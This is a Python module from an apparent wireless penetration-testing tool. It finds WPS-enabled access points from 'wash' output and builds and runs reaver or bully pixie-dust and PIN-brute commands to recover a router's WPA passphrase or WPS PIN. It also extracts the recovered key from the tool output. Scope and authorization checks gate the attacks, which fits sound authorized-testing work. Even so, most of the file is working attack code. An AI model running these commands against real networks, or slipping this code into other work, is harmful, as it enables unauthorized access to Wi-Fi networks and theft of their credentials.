"""WPS / Pixie-Dust — scope-gated, glass-box (mirrors the EAP plan pattern).

WPS is the classic fast win: a vulnerable AP's WPS exchange can be turned into
the WPA PSK in seconds (offline "pixie-dust" via pixiewps) or recovered by PIN
brute (reaver/bully). That's firing — it transmits at a specific AP — so it is
**scope-aimed and posture-gated** exactly like the rest of offense:

* **finding** WPS-enabled APs is passive (`parse_wash` on a `wash` scan) and
  always allowed;
* **attacking** one is gated: FIELD needs the BSSID in scope **and**
  ``--authorized``; LAB approves on sight (turnkey), since the scope's lab_mode
  authorizes your own gear.

Fail-closed and glass-box: a refused plan carries a reason and emits no command;
a runnable plan prints the exact reaver/bully argv. The runner is injected, so
the whole flow tests with no radio and no tools installed.
"""
from __future__ import annotations

import re
import shutil
import subprocess
from dataclasses import dataclass
from typing import Callable, List, Optional


@dataclass(frozen=True)
class WpsTarget:
    bssid: str
    channel: Optional[int] = None
    ssid: str = ""
    locked: bool = False          # WPS "Lck" — locked APs rate-limit PIN brute

    def to_dict(self) -> dict:
        return {"bssid": self.bssid, "channel": self.channel,
                "ssid": self.ssid, "locked": self.locked}


# a `wash` row: BSSID  Ch  dBm  WPS  Lck  Vendor  ESSID
_WASH = re.compile(
    r"^\s*(?P<bssid>(?:[0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2})\s+"
    r"(?P<ch>\d+)\s+(?P<dbm>-?\d+)\s+(?P<ver>[\d.]+)\s+"
    r"(?P<lck>Yes|No)\s+(?P<rest>.*?)\s*$"
)


def parse_wash(text: str) -> List[WpsTarget]:
    """Parse `wash` output into WPS targets (passive discovery). Tolerant of the
    header and ragged spacing; ESSID is whatever trails the vendor column."""
    out: List[WpsTarget] = []
    for line in (text or "").splitlines():
        m = _WASH.match(line)
        if not m:
            continue
        rest = m.group("rest").split()
        # vendor is usually one token; ESSID is the remainder (may be empty/spaces)
        ssid = " ".join(rest[1:]) if len(rest) > 1 else ""
        out.append(WpsTarget(
            bssid=m.group("bssid").lower(),
            channel=int(m.group("ch")),
            ssid=ssid,
            locked=(m.group("lck") == "Yes"),
        ))
    return out


@dataclass(frozen=True)
class WpsPlan:
    runnable: bool
    bssid: str
    tool: str
    pixie: bool
    argv: List[str]
    reason: str

    def to_dict(self) -> dict:
        return {"runnable": self.runnable, "bssid": self.bssid, "tool": self.tool,
                "pixie": self.pixie, "argv": list(self.argv), "reason": self.reason}


def authorize_wps(scope, bssid: str, *, authorized: bool, lab_mode: bool):
    """(ok, reason) — the same aiming + posture gate the rest of offense uses.
    LAB approves on sight (your own gear); FIELD needs the BSSID in scope AND an
    explicit authorized=True."""
    if scope is None:
        return False, "refused: no scope — arm the target AP (BSSID) first"
    ok, reason = scope.authorize(bssid=bssid)   # lab_mode approves on sight
    if not ok:
        return False, f"refused: BSSID {bssid} is not in the authorized scope ({reason})"
    if not lab_mode and not authorized:
        return False, ("refused: FIELD mode — pass --authorized to confirm this AP is yours "
                       "to test, or switch to LAB mode")
    posture = "LAB" if lab_mode else "authorized"
    return True, f"{posture}: WPS attack on {bssid} — {reason}"


def plan(target, scope, *, tool: str = "reaver", pixie: bool = True,
         iface: str = "wlan1mon", authorized: bool = False, lab_mode: bool = False) -> WpsPlan:
    """Build a scope-gated reaver/bully (pixie-dust) plan for one AP.

    `target` is a WpsTarget or a bare BSSID string. Fail closed: a refused or
    malformed plan has an empty argv and a reason.
    """
    if isinstance(target, WpsTarget):
        bssid, channel, locked = target.bssid, target.channel, target.locked
    else:
        bssid, channel, locked = str(target or "").strip().lower(), None, False
    tool = (tool or "reaver").lower()
    if tool not in ("reaver", "bully"):
        return WpsPlan(False, bssid, tool, pixie, [], f"refused: unknown tool '{tool}' (reaver|bully)")
    if not re.fullmatch(r"(?:[0-9a-f]{2}:){5}[0-9a-f]{2}", bssid):
        return WpsPlan(False, bssid, tool, pixie, [], f"refused: not a BSSID: {bssid!r}")

    ok, reason = authorize_wps(scope, bssid, authorized=authorized, lab_mode=lab_mode)
    if not ok:
        return WpsPlan(False, bssid, tool, pixie, [], reason)

    if tool == "reaver":
        argv = ["reaver", "-i", iface, "-b", bssid, "-vv"]
        if channel is not None:
            argv += ["-c", str(channel)]
        if pixie:
            argv += ["-K", "1"]        # pixie-dust (offline) via pixiewps
    else:  # bully
        argv = ["bully", iface, "-b", bssid]
        if channel is not None:
            argv += ["-c", str(channel)]
        if pixie:
            argv += ["-d"]             # pixie-dust
        argv += ["-v", "3"]

    note = reason
    if pixie:
        note += "; pixie-dust (offline) — seconds on a vulnerable AP"
    if locked:
        note += "; NOTE: WPS is LOCKED on this AP — PIN brute will be rate-limited (pixie may still work)"
    return WpsPlan(True, bssid, tool, pixie, argv, note)


def tool_available(tool: str, which: Callable[[str], Optional[str]] = shutil.which) -> bool:
    return which(tool) is not None


def run_plan(wplan: WpsPlan, *, runner: Optional[Callable] = None,
             timeout: int = 180) -> dict:
    """Execute a runnable WPS plan via an injected runner. Glass-box result."""
    base = {"bssid": wplan.bssid, "tool": wplan.tool, "pixie": wplan.pixie}
    if not wplan.runnable or not wplan.argv:
        return {**base, "status": "refused", "reason": wplan.reason}
    run = runner or subprocess.run
    try:
        proc = run(wplan.argv, capture_output=True, timeout=timeout, check=False)
    except subprocess.TimeoutExpired:
        return {**base, "status": "timeout", "reason": f"{wplan.tool} exceeded {timeout}s"}
    except (OSError, subprocess.SubprocessError) as e:
        return {**base, "status": "error", "reason": f"{wplan.tool} failed: {type(e).__name__}"}
    rc = getattr(proc, "returncode", None)
    out = ""
    try:
        out = (proc.stdout or b"")
        out = out.decode(errors="replace") if isinstance(out, bytes) else str(out)
    except Exception:
        pass
    # reaver/bully print the recovered PSK/PIN on success; surface it if present.
    psk = _extract_psk(out)
    if psk:
        return {**base, "status": "recovered", "reason": "WPS attack recovered a key", "key": psk}
    if rc == 0:
        return {**base, "status": "completed", "reason": f"{wplan.tool} completed (no key surfaced)"}
    return {**base, "status": "error", "reason": f"{wplan.tool} exited {rc}"}


_PSK_RE = re.compile(r"WPA\s*PSK\s*[:=]\s*['\"]?([^'\"\n]+)", re.IGNORECASE)
_PIN_RE = re.compile(r"WPS\s*PIN\s*[:=]\s*['\"]?([^'\"\n]+)", re.IGNORECASE)


def _extract_psk(text: str) -> str:
    """Prefer the recovered passphrase (WPA PSK); fall back to the WPS PIN."""
    m = _PSK_RE.search(text or "") or _PIN_RE.search(text or "")
    return m.group(1).strip() if m else ""
